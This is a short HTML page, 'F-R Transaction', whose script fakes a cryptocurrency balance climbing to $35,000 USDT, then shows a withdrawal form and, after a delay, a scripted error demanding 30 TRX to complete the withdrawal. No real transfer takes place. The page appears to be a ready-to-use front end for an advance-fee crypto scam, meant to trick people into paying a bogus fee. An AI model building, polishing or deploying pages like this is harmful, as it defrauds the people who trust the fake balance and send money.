<!DOCTYPE html>
<html>
<head>
  <title>F-R Transaction</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f0f8ff; color: #003366; text-align: center; padding: 40px; }
    .card { background: #ffffff; padding: 25px; border-radius: 12px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h2 { color: #003366; }
    .balance { font-size: 28px; margin: 20px 0; }
    .btn { background: #0066cc; color: #fff; padding: 12px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; }
    .btn:disabled { background: #999; cursor: not-allowed; }
    #error { color: #cc0000; margin-top: 20px; display: none; }
    input { width: 90%; padding: 10px; margin-top: 15px; border-radius: 8px; border: 1px solid #ccc; }
  </style>
</head>
<body>
  <div class="card">
    <h2>F-R Transaction</h2>
    <div id="balance" class="balance">$0 USDT</div>
    <button class="btn" onclick="startLoading()">Start Transaction</button>
    
    <div id="withdraw" style="display:none;">
      <input type="text" id="address" placeholder="Enter USDT Address">
      <button class="btn" onclick="confirmWithdraw()">Confirm Withdrawal</button>
    </div>
    
    <div id="error">⚠️ Error: 30 TRX required to complete withdrawal.</div>
  </div>

  <script>
    function startLoading() {
      let balance = 1;
      let display = document.getElementById("balance");
      let interval = setInterval(() => {
        display.innerText = `$${balance} USDT`;
        balance += 3500;
        if (balance > 35000) {
          clearInterval(interval);
          display.innerText = "$35,000 USDT";
          document.getElementById("withdraw").style.display = "block";
        }
      }, 1000); // 10 seconds
    }

    function confirmWithdraw() {
      document.getElementById("balance").innerText = "Processing withdrawal...";
      setTimeout(() => {
        document.getElementById("error").style.display = "block";
      }, 10000); // after 10 seconds
    }
  </script>
</body>
</html>
